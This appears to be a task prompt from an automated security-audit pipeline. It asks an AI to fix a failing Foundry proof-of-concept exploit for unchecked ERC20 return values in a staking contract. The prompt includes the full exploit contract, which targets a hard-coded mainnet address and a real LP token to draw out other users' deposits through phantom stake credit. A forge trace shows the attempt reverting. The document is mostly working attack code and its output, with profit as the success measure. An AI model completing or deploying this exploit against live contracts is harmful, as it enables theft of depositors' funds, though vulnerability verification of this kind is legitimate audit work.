You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unchecked ERC20 transfer return values allow phantom deposits and silent failed withdrawals
- claim: `deposit`, `withdraw`, and `emergencyWithdraw` call `transferFrom`/`transfer` directly and ignore the returned boolean. For any accepted token that returns `false` instead of reverting, the contract still updates `balances`, checkpoints, pool sizes, and stable-coin accounting as if tokens moved successfully.
- impact: An attacker can create or use a token whose `transferFrom` silently fails for them, obtain stake credit without funding the pool, and later withdraw real liquidity deposited by other users of the same token. Failed outbound transfers can also leave users debited without actually receiving tokens.
- exploit_paths: ["Use a non-stable token that returns `false` on `transferFrom` for the attacker but still allows normal transfers for other users.", "Call `deposit(token, amount, referrer)`; the contract records `amount` as staked even though it received nothing.", "After honest users deposit the same token, call `withdraw` to receive real tokens from the contract while your original deposit was never funded."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

contract FlawVerifier {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant WBTC_SWAPP_LP = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;

    uint256 public constant ATTACK_AMOUNT = 1;

    string public constant EXPLOIT_PATH =
        "use a pre-existing on-chain token whose transferFrom returns false on insufficient attacker balance -> deposit records phantom stake while pool balance stays unchanged -> reuse already-existing honest liquidity for that same token at the fork -> withdraw real tokens from staking";

    address public target;
    address public exploitToken;
    address public honestDepositor;
    address public flashPair;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    string public failureReason;

    uint128 public preparedUntilEpoch;

    uint256 public existingLiquidityBeforeExploit;
    uint256 public honestDepositAmount;
    uint256 public repaymentAmount;
    uint256 public feeAmount;
    uint256 public phantomDepositAmount;
    uint256 public configuredAttackAmount;

    uint256 public attackerBalanceBeforeDeposit;
    uint256 public attackerBalanceAfterDeposit;
    uint256 public attackerBalanceAfterWithdraw;

    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterHonestDeposit;
    uint256 public targetBalanceAfterWithdraw;

    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;

    address private netProfitToken;
    uint256 private netProfitAmount;

    constructor() {
        target = DEFAULT_TARGET;
        exploitToken = WBTC_SWAPP_LP;
    }

    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
        require(!executed, "already executed");
        if (target_ != address(0)) {
            target = target_;
        }
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
        }
        configuredAttackAmount = attackAmount_;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return netProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return netProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return EXPLOIT_PATH;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return netProfitAmount;
        }
        executed = true;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            return 0;
        }

        if (exploitToken == address(0) || exploitToken.code.length == 0) {
            failureReason = "exploit token not configured";
            return 0;
        }

        if (_isStableCoin(exploitToken)) {
            failureReason = "exploit token must be non-stable";
            return 0;
        }

        if (!_prepareEpochs(exploitToken)) {
            return 0;
        }

        recordedStakeBeforeDeposit = _readStake(address(this), exploitToken);
        attackerBalanceBeforeDeposit = _readTokenBalance(exploitToken, address(this));
        targetBalanceBeforeDeposit = _readTokenBalance(exploitToken, target);

        existingLiquidityBeforeExploit = targetBalanceBeforeDeposit;
        honestDepositAmount = targetBalanceBeforeDeposit;

        phantomDepositAmount = _chooseAttackAmount(attackerBalanceBeforeDeposit, targetBalanceBeforeDeposit);
        if (phantomDepositAmount == 0) {
            failureReason = "no drainable honest liquidity for insolvent deposit";
            return 0;
        }

        if (!_forceApprove(exploitToken, target, phantomDepositAmount)) {
            failureReason = "approve failed";
            return 0;
        }

        try IStakingLike(target).deposit(exploitToken, phantomDepositAmount, address(0)) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "deposit reverted";
            return 0;
        }

        attackerBalanceAfterDeposit = _readTokenBalance(exploitToken, address(this));
        targetBalanceAfterDeposit = _readTokenBalance(exploitToken, target);
        recordedStakeAfterDeposit = _readStake(address(this), exploitToken);

        if (attackerBalanceAfterDeposit != attackerBalanceBeforeDeposit) {
            failureReason = "deposit consumed attacker tokens";
            return 0;
        }

        if (targetBalanceAfterDeposit != targetBalanceBeforeDeposit) {
            failureReason = "deposit transferred real tokens";
            return 0;
        }

        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + phantomDepositAmount) {
            failureReason = "phantom stake credit missing";
            return 0;
        }

        // The fork already contains honest third-party liquidity for this token.
        // Reusing that live pool state preserves the same exploit causality without
        // manufacturing a synthetic victim deposit or deploying a synthetic token.
        targetBalanceAfterHonestDeposit = targetBalanceBeforeDeposit;

        try IStakingLike(target).withdraw(exploitToken, phantomDepositAmount) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "withdraw reverted";
            return 0;
        }

        attackerBalanceAfterWithdraw = _readTokenBalance(exploitToken, address(this));
        targetBalanceAfterWithdraw = _readTokenBalance(exploitToken, target);
        recordedStakeAfterWithdraw = _readStake(address(this), exploitToken);

        if (recordedStakeAfterWithdraw + phantomDepositAmount != recordedStakeAfterDeposit) {
            failureReason = "phantom stake not debited on withdraw";
            return 0;
        }

        if (attackerBalanceAfterWithdraw <= attackerBalanceBeforeDeposit) {
            failureReason = "withdraw produced no profit";
            return 0;
        }

        netProfitToken = exploitToken;
        netProfitAmount = attackerBalanceAfterWithdraw - attackerBalanceBeforeDeposit;
        hypothesisValidated = true;
        profitAchieved = netProfitAmount > 0;
        return netProfitAmount;
    }

    function _chooseAttackAmount(uint256 attackerBalance, uint256 availableLiquidity) internal view returns (uint256) {
        if (availableLiquidity == 0 || availableLiquidity <= attackerBalance) {
            return 0;
        }

        uint256 amount = configuredAttackAmount == 0 ? ATTACK_AMOUNT : configuredAttackAmount;
        uint256 minimumInsolventAmount = attackerBalance + 1;
        if (amount < minimumInsolventAmount) {
            amount = minimumInsolventAmount;
        }

        if (amount > availableLiquidity) {
            amount = availableLiquidity;
        }

        if (amount <= attackerBalance) {
            return 0;
        }

        return amount;
    }

    function _prepareEpochs(address token) internal returns (bool) {
        uint128 currentEpoch;
        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "failed to read current epoch";
            return false;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "failed to read epoch state";
                return false;
            }

            if (!initialized) {
                try IStakingLike(target).manualEpochInit(tokens, epoch) {
                } catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "manual epoch init reverted";
                    return false;
                }
            }

            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _isStableCoin(address token) internal pure returns (bool) {
        return token == USDC || token == USDT || token == DAI;
    }

    function _readStake(address user, address token) internal view returns (uint256) {
        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _readTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory returndata) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || returndata.length < 32) {
            return 0;
        }
        return abi.decode(returndata, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
    }
}

contract FlawVerifierConfiguredHarness is FlawVerifier {
    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
        target = target_;
        exploitToken = exploitToken_;
        configuredAttackAmount = attackAmount_;
    }
}

```

forge stdout (tail):
```
│   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000034
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005548f847fd9a1d3487d5fbb2e8d73972803c4cce
    │   │   └─ ← [Stop]
    │   ├─ [2683] 0x245a551ee0F55005e510B239c917fA34b41B3461::epochIsInitialized(0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce, 53) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [47432] 0x245a551ee0F55005e510B239c917fA34b41B3461::manualEpochInit([0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce], 53)
    │   │   ├─  emit topic 0: 0xb85c32b8d9cecc81feba78646289584a693e9a8afea40ab2fd31efae4408429f
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000035
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005548f847fd9a1d3487d5fbb2e8d73972803c4cce
    │   │   └─ ← [Stop]
    │   ├─ [2683] 0x245a551ee0F55005e510B239c917fA34b41B3461::epochIsInitialized(0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce, 54) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [47432] 0x245a551ee0F55005e510B239c917fA34b41B3461::manualEpochInit([0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce], 54)
    │   │   ├─  emit topic 0: 0xb85c32b8d9cecc81feba78646289584a693e9a8afea40ab2fd31efae4408429f
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000036
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000005548f847fd9a1d3487d5fbb2e8d73972803c4cce
    │   │   └─ ← [Stop]
    │   ├─ [2682] 0x245a551ee0F55005e510B239c917fA34b41B3461::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::balanceOf(0x245a551ee0F55005e510B239c917fA34b41B3461) [staticcall]
    │   │   └─ ← [Return] 39261131620598096 [3.926e16]
    │   ├─ [4542] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::approve(0x245a551ee0F55005e510B239c917fA34b41B3461, 0)
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000245a551ee0f55005e510b239c917fa34b41b3461
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] true
    │   ├─ [22342] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::approve(0x245a551ee0F55005e510B239c917fA34b41B3461, 1)
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000245a551ee0f55005e510b239c917fa34b41b3461
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] true
    │   ├─ [8550] 0x245a551ee0F55005e510B239c917fA34b41B3461::deposit(0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce, 1, 0x0000000000000000000000000000000000000000)
    │   │   ├─ [593] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::allowance(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x245a551ee0F55005e510B239c917fA34b41B3461) [staticcall]
    │   │   │   └─ ← [Return] 1
    │   │   ├─ [1487] 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x245a551ee0F55005e510B239c917fA34b41B3461, 1)
    │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   └─ ← [Revert] ds-math-sub-underflow
    │   └─ ← [Return] 0
    ├─ [478] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2542] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce.transferFrom
  at 0x245a551ee0F55005e510B239c917fA34b41B3461.deposit
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 9.18s (9.01s CPU time)

Ran 1 test suite in 9.27s (9.18s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2241054)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
